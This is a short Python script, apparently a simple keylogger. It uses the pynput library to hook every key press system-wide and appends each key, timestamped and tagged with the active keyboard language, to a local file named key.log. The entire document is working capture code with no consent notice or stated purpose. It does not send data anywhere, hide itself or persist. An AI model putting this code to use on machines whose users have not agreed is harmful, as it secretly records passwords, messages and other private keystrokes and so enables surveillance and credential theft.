from pynput import keyboard
import logging
from tools.getKeyLang import get_keyboard_language


log = logging.getLogger()

log.setLevel(logging.INFO)

formatter = logging.Formatter('%(asctime)s | %(name)s | %(levelname)s | %(message)s')

file_handler = logging.FileHandler("key.log", encoding="utf-8")
file_handler.setFormatter(formatter)
log.addHandler(file_handler)

def on_press(key):
    global char
    lang = get_keyboard_language()
    if key:
        try:
            log.info(f"{lang} | {key.char}")
        except AttributeError:
            log.info(f"{lang} | {key}")

with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()

